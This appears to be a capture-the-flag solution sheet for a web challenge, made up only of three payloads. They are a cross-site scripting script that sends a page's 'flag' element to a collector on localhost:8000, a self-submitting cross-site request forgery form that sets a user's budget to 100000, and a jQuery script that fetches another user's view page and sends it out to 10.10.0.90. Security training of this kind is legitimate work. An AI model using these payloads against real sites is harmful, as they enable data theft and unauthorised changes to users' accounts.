To get flag1:
    <script>var x = document.getElementById('flag').innerHTML;document.location = 'http://localhost:8000/' + x;</script>


To get flag2:
    <form method="post" action="/update-budget" name="form">
        <input type="hidden" name="username" value="abcdabcd">
        <input type="hidden" name="identifier" value="0efe4d62d9dd91f9cbd5c2219726ea0f">
        <input type="hidden" value="100000" name="budget">
    </form>
    <script>document.form.submit();</script>


To get flag3:
    <script src="https://code.jquery.com/jquery-1.9.1.min.js"></script>
    <script>
       
       $(function () {
          $.get('/user/view?identifier=805bbd30986ea885c07d728ce4d7e1c4', function (response) {
             alert(response);
             
             $.ajax({
                type: 'GET',
                url: 'http://10.10.0.90/' + response,
                data: response,
            });
             
          });
       });

    </script>